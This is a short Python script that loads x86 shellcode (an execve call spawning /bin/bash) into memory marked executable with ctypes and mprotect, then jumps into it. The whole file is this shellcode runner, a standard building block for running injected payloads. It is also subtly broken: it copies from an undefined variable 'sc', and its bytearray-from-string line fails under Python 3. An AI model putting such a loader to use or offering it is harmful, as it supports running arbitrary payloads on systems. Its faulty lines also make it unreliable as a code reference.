from ctypes import *
import os

shellcode = bytearray("\x31\xc0\x50\x68\x62\x61\x73\x68\x68\x62\x69\x6e\x2f\x68\x2f\x2f\x2f\x2f\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")


libc = CDLL('libc.so.6')                    # implement C functions (duh)
c = c_char_p(shellcode)                    # character pointer (NUL terminated)
size = len(shellcode)                       # size of the shellcode executing
addr = c_void_p(libc.valloc(size))          # allocate bytes and return pointer to allocated memory
memmove(addr, sc, size)                     # copy bytes to allocated memory destination
libc.mprotect(addr, size, 0x7)              # change access protections
run = cast(addr, CFUNCTYPE(c_void_p))       # calling convention
run() # run the shellcode
